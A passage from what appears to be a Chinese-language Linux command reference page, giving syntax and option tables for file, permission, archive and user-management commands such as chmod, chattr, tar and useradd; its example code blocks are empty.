<td style="text-align:left">与 <code>-d</code> 相同，但允许设置起始值</td>
</tr>
<tr>
<td style="text-align:center"><code>-x</code></td>
<td style="text-align:left">使用从 0 开始的十六进制后缀，而不是字母后缀</td>
</tr>
<tr>
<td style="text-align:center"><code>--hex-suffixes[=FROM]</code></td>
<td style="text-align:left">与 <code>-x</code> 相同，但允许设置起始值</td>
</tr>
<tr>
<td style="text-align:center"><code>-e</code></td>
<td style="text-align:left">不会生成带有 <code>-n</code> 的空输出文件</td>
</tr>
<tr>
<td style="text-align:center"><code>--filter=COMMAND</code></td>
<td style="text-align:left">写入 shel 命令；文件名为 <code>$file</code></td>
</tr>
<tr>
<td style="text-align:center"><code>-l</code></td>
<td style="text-align:left">指定分割每个文件的长度（默认为 1000 行）</td>
</tr>
<tr>
<td style="text-align:center"><code>-n</code></td>
<td style="text-align:left">指定分割多少个文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-u</code></td>
<td style="text-align:left">使用 <code>-n r/…</code> 立即将输入复制到输出</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> touch</h3>
<p><code>touch</code> 用于创建空白文件或设置文件的时间。语法格式：<code>touch [选项] 文件名称</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">仅修改 “读取时间”（atime）</td>
</tr>
<tr>
<td style="text-align:center"><code>-m</code></td>
<td style="text-align:left">仅修改 “修改时间”（mtime）</td>
</tr>
<tr>
<td style="text-align:center"><code>-d</code></td>
<td style="text-align:left">同时修改 atime 和 mtime</td>
</tr>
<tr>
<td style="text-align:center"><code>-c</code></td>
<td style="text-align:left">仅修改文件的时间，若该文件不存在则不建立新文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-t</code></td>
<td style="text-align:left">后面可以接想要修改的时间而不用目前时间，格式为 <code>[YYMMDDhhmm]</code></td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> mkdir</h3>
<p><code>mkdir</code> 用于创建目录。语法格式：<code>mkdir [选项] 目录名称</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-p</code></td>
<td style="text-align:left">递归创建目录</td>
</tr>
<tr>
<td style="text-align:center"><code>-m</code></td>
<td style="text-align:left">在创建目录的同时设定权限</td>
</tr>
<tr>
<td style="text-align:center"><code>-v</code></td>
<td style="text-align:left">显示创建目录的过程信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-Z</code></td>
<td style="text-align:left">将每个创建的目录的 SELinux 安全环境设置为 CTX</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> chmod</h3>
<p><code>chmod</code> 用于修改文件属主、属组和其他用户访问权限。语法格式：<code>chmod [选项] 文件名</code></p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>读、写、执行的权限可以分别用：<code>4、2、1</code> 数字表示</p>
<p>属主、属组、其他用户可以分别用：<code>u、g、o</code> 表示</p>
<p>字母 <code>a</code> 包括属主、属组、其他用户</p>
</div>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-c</code></td>
<td style="text-align:left">若该文件权限确实已经更改，才显示其更改动作</td>
</tr>
<tr>
<td style="text-align:center"><code>-f</code></td>
<td style="text-align:left">若该文件权限无法被更改也不要显示错误信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-v</code></td>
<td style="text-align:left">显示权限变更的详细信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-R</code></td>
<td style="text-align:left">递归更改文件和目录</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul>
<li><strong>d</strong>：这个 <code>d</code> 表示这是一个目录文件（<code>-</code> 表示普通文件；<code>l</code> 表示链接文件；<code>p</code> 表示管道文件；<code>b</code> 表示块设备文件；<code>c</code> 表示字符设备文件）</li>
<li><strong>rwx</strong>：第一个 <code>rwx</code> 表示属主具有读、写、执行的权限</li>
<li><strong>r-x</strong>：第二个 <code>r-x</code> 表示属组具有读、执行的权限（读、写、执行，没有哪一个权限，就用 <code>-</code> 代替）</li>
<li><strong>r-x</strong>：第三个 <code>r-x</code> 表示其他用户具有读、执行的权限</li>
<li><strong>.</strong>：最后的 <code>.</code> 表示 SELinux 安全机制打开</li>
</ul>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>特殊权限：</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>u+s</code></td>
<td style="text-align:left">设置 SUID 权限</td>
</tr>
<tr>
<td style="text-align:center"><code>u-s</code></td>
<td style="text-align:left">取消 SUID 权限</td>
</tr>
<tr>
<td style="text-align:center"><code>g+s</code></td>
<td style="text-align:left">设置 SGID 权限</td>
</tr>
<tr>
<td style="text-align:center"><code>g-s</code></td>
<td style="text-align:left">取消 SGID 权限</td>
</tr>
<tr>
<td style="text-align:center"><code>o+t</code></td>
<td style="text-align:left">设置 SBIT 权限</td>
</tr>
<tr>
<td style="text-align:center"><code>o-t</code></td>
<td style="text-align:left">取消 SBIT 权限</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p><strong>SUID</strong>：可以让执行者临时拥有文件属主的权限</p>
<ul>
<li>如果原有文件有 <code>x</code> 执行权，赋予特殊权限后为 <code>rws</code>，如果原有文件没有 <code>x</code> 执行权，赋予特殊权限后为 <code>rwS</code>（例如：-<code>rws</code>r-xr-x.）</li>
</ul>
</li>
<li>
<p><strong>SGID</strong>：对普通文件设置时，让执行者临时拥有文件属组的权限；而对目录进行设置时，让目录内新创建的文件属组自动继承该目录原有的属组</p>
<ul>
<li>如果原有文件有 <code>x</code> 执行权，赋予特殊权限后为 <code>rws</code>，如果原有文件没有 <code>x</code> 执行权，赋予特殊权限后为 <code>rwS</code>（例如：-rwx<code>r-s</code>r-x.）</li>
</ul>
</li>
<li>
<p><strong>SBIT</strong>：该目录中的文件就只能被其属主用户删除，其他用户没有删除权限</p>
<ul>
<li>如果原有文件有 <code>x</code> 执行权，赋予特殊权限后为 <code>rwt</code>，如果原有文件没有 <code>x</code> 执行权，赋予特殊权限后为 <code>rwT</code>（例如：-rwxr-x<code>r-t</code>.）</li>
</ul>
</li>
<li>
<p><strong>X</strong>：特殊执行权限，只有当文件为目录文件，或者其他类型的用户有可执行权限时，才将文件权限设置可执行</p>
</li>
</ul>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> chattr</h3>
<p><code>chattr</code> 用于设置文件的隐藏权限。语法格式：<code>chattr [选项] 文件名</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>i</code></td>
<td style="text-align:left">无法对文件进行修改，若对目录设置该选项，则仅能修改其中的子文件内容而不能新建或删除文件</td>
</tr>
<tr>
<td style="text-align:center"><code>a</code></td>
<td style="text-align:left">仅允许补充（追加）内容，无法覆盖/删除内容（Append Only）</td>
</tr>
<tr>
<td style="text-align:center"><code>S</code></td>
<td style="text-align:left">文件内容在变更后立即同步到硬盘（sync）</td>
</tr>
<tr>
<td style="text-align:center"><code>s</code></td>
<td style="text-align:left">彻底从硬盘中删除，不可恢复（用 0 填充原文件所在硬盘区域）</td>
</tr>
<tr>
<td style="text-align:center"><code>A</code></td>
<td style="text-align:left">不再修改这个文件或目录的最后访问时间（atime）</td>
</tr>
<tr>
<td style="text-align:center"><code>b</code></td>
<td style="text-align:left">不再修改文件或目录的存取时间</td>
</tr>
<tr>
<td style="text-align:center"><code>D</code></td>
<td style="text-align:left">检查压缩文件中的错误</td>
</tr>
<tr>
<td style="text-align:center"><code>d</code></td>
<td style="text-align:left">使用 dump 命令备份时忽略本文件/目录</td>
</tr>
<tr>
<td style="text-align:center"><code>c</code></td>
<td style="text-align:left">默认将文件或目录进行压缩</td>
</tr>
<tr>
<td style="text-align:center"><code>U</code></td>
<td style="text-align:left">当删除该文件后依然保留其在硬盘中的数据，方便日后恢复</td>
</tr>
<tr>
<td style="text-align:center"><code>t</code></td>
<td style="text-align:left">让文件系统支持尾部合并（tail-merging）</td>
</tr>
<tr>
<td style="text-align:center"><code>x</code></td>
<td style="text-align:left">可以直接访问压缩文件中的内容</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> lsattr</h3>
<p><code>lsattr</code> 用于查看文件的隐藏权限。语法格式：<code>lsattr [选项] 文件名</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-R</code></td>
<td style="text-align:left">递归列出目录及其内容的属性</td>
</tr>
<tr>
<td style="text-align:center"><code>-V</code></td>
<td style="text-align:left">显示程序版本</td>
</tr>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">列出目录中的所有文件，包括以 <code>.</code> 开头的文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-d</code></td>
<td style="text-align:left">列出目录，而不是列出其内容</td>
</tr>
<tr>
<td style="text-align:center"><code>-l</code></td>
<td style="text-align:left">使用长名称而不是单字符缩写打印选项</td>
</tr>
<tr>
<td style="text-align:center"><code>-p</code></td>
<td style="text-align:left">列出文件的项目编号</td>
</tr>
<tr>
<td style="text-align:center"><code>-v</code></td>
<td style="text-align:left">列出文件的版本/生成编号</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> setfacl</h3>
<p><code>setfacl</code> 用于管理文件的 ACL 权限规则。语法格式：<code>setfacl [选项] 文件名</code></p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>查看文件是否设置 ACL 权限，可以通过 <code>ls</code> 命令查看文件最后的 <code>.</code>，如果变成 <code>+</code> 号，则这个文件已经设置了 ACL 权限</p>
</div>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-m</code></td>
<td style="text-align:left">修改权限</td>
</tr>
<tr>
<td style="text-align:center"><code>-M</code></td>
<td style="text-align:left">从文件中读取权限</td>
</tr>
<tr>
<td style="text-align:center"><code>-x</code></td>
<td style="text-align:left">删除某个权限</td>
</tr>
<tr>
<td style="text-align:center"><code>-b</code></td>
<td style="text-align:left">删除全部权限</td>
</tr>
<tr>
<td style="text-align:center"><code>-R</code></td>
<td style="text-align:left">递归子目录</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3> getfacl</h3>
<p><code>getfacl</code> 用于查看文件的 ACL 权限规则。语法格式：<code>getfacl [选项] 文件名</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">仅显示文件访问控制列表</td>
</tr>
<tr>
<td style="text-align:center"><code>-d</code></td>
<td style="text-align:left">仅显示默认访问控制列表</td>
</tr>
<tr>
<td style="text-align:center"><code>-c</code></td>
<td style="text-align:left">不显示注释标题</td>
</tr>
<tr>
<td style="text-align:center"><code>-e</code></td>
<td style="text-align:left">打印所有有效权限</td>
</tr>
<tr>
<td style="text-align:center"><code>-E</code></td>
<td style="text-align:left">打印无有效权限</td>
</tr>
<tr>
<td style="text-align:center"><code>-s</code></td>
<td style="text-align:left">只包含基本项的跳过文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-R</code></td>
<td style="text-align:left">递归到子目录中</td>
</tr>
<tr>
<td style="text-align:center"><code>-L</code></td>
<td style="text-align:left">逻辑行走，遵循符号链接</td>
</tr>
<tr>
<td style="text-align:center"><code>-P</code></td>
<td style="text-align:left">物理行走，不遵循符号链接</td>
</tr>
<tr>
<td style="text-align:center"><code>-t</code></td>
<td style="text-align:left">使用表格输出格式</td>
</tr>
<tr>
<td style="text-align:center"><code>-n</code></td>
<td style="text-align:left">打印数字用户/组标识符</td>
</tr>
<tr>
<td style="text-align:center"><code>-p</code></td>
<td style="text-align:left">不去除路径名中的前导 <code>/</code></td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3> cp</h3>
<p><code>cp</code> 用于本地复制文件或目录。语法格式：<code>cp [选项] 源文件 目标文件</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-p</code></td>
<td style="text-align:left">保留原始文件的属性</td>
</tr>
<tr>
<td style="text-align:center"><code>-d</code></td>
<td style="text-align:left">若对象为 “链接文件”，则保留该 “链接文件” 的属性</td>
</tr>
<tr>
<td style="text-align:center"><code>-r</code></td>
<td style="text-align:left">递归复制目录</td>
</tr>
<tr>
<td style="text-align:center"><code>-i</code></td>
<td style="text-align:left">若目标文件存在，则询问是否覆盖</td>
</tr>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">向当于 <code>-pdr</code></td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> scp</h3>
<p><code>scp</code> 用于跨主机传输数据，而且所有的数据都进行加密处理。语法格式：<code>scp [选项] 本地文件 远程账户@远程IP地址:远程目录 | scp [选项] 远程账户@远程IP地址:远程目录 本地文件</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-v</code></td>
<td style="text-align:left">显示详细的连接进度</td>
</tr>
<tr>
<td style="text-align:center"><code>-P</code></td>
<td style="text-align:left">指定远程主机的 sshd 端口号</td>
</tr>
<tr>
<td style="text-align:center"><code>-r</code></td>
<td style="text-align:left">用于传送文件夹</td>
</tr>
<tr>
<td style="text-align:center"><code>-6</code></td>
<td style="text-align:left">使用 IPv6 协议</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3> mv</h3>
<p><code>mv</code> 用于移动或重命名文件。语法格式：<code>mv [选项] 源文件 目标文件</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-b</code></td>
<td style="text-align:left">当文件存在时，覆盖前为其创建一个备份</td>
</tr>
<tr>
<td style="text-align:center"><code>-f</code></td>
<td style="text-align:left">强制覆盖前不提示</td>
</tr>
<tr>
<td style="text-align:center"><code>-i</code></td>
<td style="text-align:left">覆盖前的交互式提示</td>
</tr>
<tr>
<td style="text-align:center"><code>-n</code></td>
<td style="text-align:left">无清除不覆盖现有文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-S</code></td>
<td style="text-align:left">为备份文件指定后缀，而不使用默认的后缀</td>
</tr>
<tr>
<td style="text-align:center"><code>-u</code></td>
<td style="text-align:left">仅当 SOURCE 文件较新时更新移动目标文件</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> rm</h3>
<p><code>rm</code> 用于删除文件或目录。语法格式：<code>rm [选项] 文件名称</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-f</code></td>
<td style="text-align:left">强制执行</td>
</tr>
<tr>
<td style="text-align:center"><code>-i</code></td>
<td style="text-align:left">删除前询问</td>
</tr>
<tr>
<td style="text-align:center"><code>-r</code></td>
<td style="text-align:left">删除目录</td>
</tr>
<tr>
<td style="text-align:center"><code>-v</code></td>
<td style="text-align:left">显示过程</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> dd</h3>
<p><code>dd</code> 用于按照指定大小的数据块个数来复制文件或转换文件。语法格式：<code>dd if=参数值 of=参数值 count=参数值 bs=参数值</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>if</code></td>
<td style="text-align:left">输入的文件名称</td>
</tr>
<tr>
<td style="text-align:center"><code>of</code></td>
<td style="text-align:left">输出的文件名称</td>
</tr>
<tr>
<td style="text-align:center"><code>bs</code></td>
<td style="text-align:left">设置每个 “块” 的大小</td>
</tr>
<tr>
<td style="text-align:center"><code>count</code></td>
<td style="text-align:left">设置要复制 “块” 的个数</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> file</h3>
<p><code>file</code> 用于查看文件的类型。语法格式：<code>file 文件名称</code></p>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> tar</h3>
<p><code>tar</code> 用于对文件进行打包压缩或解压。语法格式：<code>tar [选项] 压缩名 文件名称</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-c</code></td>
<td style="text-align:left">创建压缩文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-x</code></td>
<td style="text-align:left">解开压缩文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-t</code></td>
<td style="text-align:left">查看压缩包内的文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-z</code></td>
<td style="text-align:left">用 Gzip 压缩或解压</td>
</tr>
<tr>
<td style="text-align:center"><code>-j</code></td>
<td style="text-align:left">用 bzip2 压缩或解压</td>
</tr>
<tr>
<td style="text-align:center"><code>-v</code></td>
<td style="text-align:left">显示压缩或解压的过程</td>
</tr>
<tr>
<td style="text-align:center"><code>-f</code></td>
<td style="text-align:left">目标文件名</td>
</tr>
<tr>
<td style="text-align:center"><code>-p</code></td>
<td style="text-align:left">保留原始的权限与属性</td>
</tr>
<tr>
<td style="text-align:center"><code>-P</code></td>
<td style="text-align:left">使用绝对路径来压缩</td>
</tr>
<tr>
<td style="text-align:center"><code>-C</code></td>
<td style="text-align:left">指定解压到的目录</td>
</tr>
<tr>
<td style="text-align:center"><code>-r</code></td>
<td style="text-align:left">指定的任意文件加入到归档文件中</td>
</tr>
<tr>
<td style="text-align:center"><code>--exclude</code></td>
<td style="text-align:left">将匹配通配符模式的文件排除在归档过程之外</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> zip</h3>
<p><code>zip</code> 用于对文件或目录进行压缩。语法格式：<code>zip [选项] 压缩名 文件名</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-d</code></td>
<td style="text-align:left">删除 zip 文件中的条目</td>
</tr>
<tr>
<td style="text-align:center"><code>-m</code></td>
<td style="text-align:left">移动到 zip 文件中（删除操作系统文件）</td>
</tr>
<tr>
<td style="text-align:center"><code>-r</code></td>
<td style="text-align:left">递归到目录</td>
</tr>
<tr>
<td style="text-align:center"><code>-q</code></td>
<td style="text-align:left">不显示过程</td>
</tr>
<tr>
<td style="text-align:center"><code>-v</code></td>
<td style="text-align:left">详细信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-c</code></td>
<td style="text-align:left">添加一行注释</td>
</tr>
<tr>
<td style="text-align:center"><code>-z</code></td>
<td style="text-align:left">添加 zip 文件注释</td>
</tr>
<tr>
<td style="text-align:center"><code>-x "文件列表"</code></td>
<td style="text-align:left">排除 "文件列表" 中文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-i "文件列表"</code></td>
<td style="text-align:left">仅包括 "文件列表" 中文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-F</code></td>
<td style="text-align:left">修复 zip 文件（<code>-FF</code> 更努力）</td>
</tr>
<tr>
<td style="text-align:center"><code>-D</code></td>
<td style="text-align:left">不添加目录项</td>
</tr>
<tr>
<td style="text-align:center"><code>-T</code></td>
<td style="text-align:left">测试 zip 文件完整性</td>
</tr>
<tr>
<td style="text-align:center"><code>-e</code></td>
<td style="text-align:left">加密</td>
</tr>
<tr>
<td style="text-align:center"><code>-压缩级别</code></td>
<td style="text-align:left"><code>-1</code> 压缩更快 <code>-9</code> 次压缩更好</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3> unzip</h3>
<p><code>unzip</code> 用于解压以 <code>.zip</code> 为后缀的压缩包文件。语法格式：<code>unzip [选项] 压缩包文件</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-d</code></td>
<td style="text-align:left">删除 zip 文件中的条目</td>
</tr>
<tr>
<td style="text-align:center"><code>-l</code></td>
<td style="text-align:left">查看压缩包文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-t</code></td>
<td style="text-align:left">测试压缩包是否正确</td>
</tr>
<tr>
<td style="text-align:center"><code>-z</code></td>
<td style="text-align:left">仅显示压缩包注释</td>
</tr>
<tr>
<td style="text-align:center"><code>-v</code></td>
<td style="text-align:left">详细信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-x "文件列表"</code></td>
<td style="text-align:left">解压时排除 "文件列表" 中文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-d</code></td>
<td style="text-align:left">将文件解压缩到指定目录中</td>
</tr>
<tr>
<td style="text-align:center"><code>-n</code></td>
<td style="text-align:left">从不覆盖现有文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-q</code></td>
<td style="text-align:left">不显示过程</td>
</tr>
<tr>
<td style="text-align:center"><code>-o</code></td>
<td style="text-align:left">在没有提示的情况下覆盖文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">自动转换任何文本文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-C</code></td>
<td style="text-align:left">匹配文件名不区分大小写</td>
</tr>
<tr>
<td style="text-align:center"><code>-L</code></td>
<td style="text-align:left">使（某些）名称小写</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2> 用户命令</h2>
<h3> id</h3>
<p><code>id</code> 用于显示用户详细信息。语法格式：<code>id 用户名</code></p>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> useradd</h3>
<p><code>useradd</code> 用于创建用户账户。语法格式：<code>useradd [选项] 用户名</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-d</code></td>
<td style="text-align:left">指定用户家目录（默认为 <code>/home/</code> 目录下）</td>
</tr>
<tr>
<td style="text-align:center"><code>-e</code></td>
<td style="text-align:left">账户的到期时间，格式为：<code>YYYY-MM-DD</code></td>
</tr>
<tr>
<td style="text-align:center"><code>-u</code></td>
<td style="text-align:left">指定该用户的默认 UID</td>
</tr>
<tr>
<td style="text-align:center"><code>-g</code></td>
<td style="text-align:left">指定一个初始的用户组（该组必须存在）</td>
</tr>
<tr>
<td style="text-align:center"><code>-G</code></td>
<td style="text-align:left">指定一个或多个扩展用户组</td>
</tr>
<tr>
<td style="text-align:center"><code>-N</code></td>
<td style="text-align:left">不创建与用户同名的基本用户组</td>
</tr>
<tr>
<td style="text-align:center"><code>-s</code></td>
<td style="text-align:left">指定该用户的默认 Shell 解释器</td>
</tr>
<tr>
<td style="text-align:center"><code>-M</code></td>
<td style="text-align:left">不创建用户家目录</td>
</tr>
<tr>
<td style="text-align:center"><code>-r</code></td>
<td style="text-align:left">创建系统用户</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> groupadd</h3>
<p><code>groupadd</code> 用于创建用户组。语法格式：<code>groupadd [选项] 用户组名</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-g</code></td>
<td style="text-align:left">指定新建工作组的 id</td>
</tr>
<tr>
<td style="text-align:center"><code>-r</code></td>
<td style="text-align:left">创建系统工作组，系统工作组的组 ID 小于 500</td>
</tr>
<tr>
<td style="text-align:center"><code>-K</code></td>
<td style="text-align:left">覆盖配置文件 <code>/etc/login.defs</code></td>
</tr>
<tr>
<td style="text-align:center"><code>-o</code></td>
<td style="text-align:left">允许添加组 ID 号不唯一的工作组</td>
</tr>
<tr>
<td style="text-align:center"><code>-f</code></td>
<td style="text-align:left">如果指定的组已经存在，此选项将失明了仅以成功状态退出。当与 <code>-g</code> 一起使用，并且指定的 GID_MIN 已经存在时，选择另一个唯一的 GID（即 <code>-g</code> 关闭）</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> usermod</h3>
<p><code>usermod</code> 用于修改用户的属性。语法格式：<code>usermod [选项] 用户名</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-c</code></td>
<td style="text-align:left">填写用户账户的备注信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-d -m</code></td>
<td style="text-align:left">选项 <code>-m</code> 与 <code>-d</code> 连用，可重新指定用户的家目录并自动把旧的数据转移过去</td>
</tr>
<tr>
<td style="text-align:center"><code>-e</code></td>
<td style="text-align:left">账户的到期时间，格式为 <code>YYYY-MM-DD</code></td>
</tr>
<tr>
<td style="text-align:center"><code>-g</code></td>
<td style="text-align:left">变更所属用户组</td>
</tr>
<tr>
<td style="text-align:center"><code>-G</code></td>
<td style="text-align:left">变更扩展用户组</td>
</tr>
<tr>
<td style="text-align:center"><code>-L</code></td>
<td style="text-align:left">锁定用户禁止其登录系统</td>
</tr>
<tr>
<td style="text-align:center"><code>-U</code></td>
<td style="text-align:left">解锁用户，允许其登录系统</td>
</tr>
<tr>
<td style="text-align:center"><code>-u</code></td>
<td style="text-align:left">修改用户的 UID</td>
</tr>
<tr>
<td style="text-align:center"><code>-s</code></td>
<td style="text-align:left">变更默认终端</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> passwd</h3>
<p><code>passwd</code> 用于修改用户的密码、过期时间等信息。语法格式：<code>passwd [选项] 用户名</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-l</code></td>
<td style="text-align:left">锁定用户，禁止用户登录</td>
</tr>
<tr>
<td style="text-align:center"><code>-u</code></td>
<td style="text-align:left">解除锁定，运行用户登录</td>
</tr>
<tr>
<td style="text-align:center"><code>-d</code></td>
<td style="text-align:left">使该用户可用空密码登录系统</td>
</tr>
<tr>
<td style="text-align:center"><code>-e</code></td>
<td style="text-align:left">强制用户在下次登录时修改密码</td>
</tr>
<tr>
<td style="text-align:center"><code>-S</code></td>
<td style="text-align:left">显示用户的密码是否被锁定，以及密码所采用的加密算法名称</td>
</tr>
<tr>
<td style="text-align:center"><code>--stdin</code></td>
<td style="text-align:left">允许通过标准输入修改密码</td>
</tr>
</tbody>
</table>
<p>example：</p>
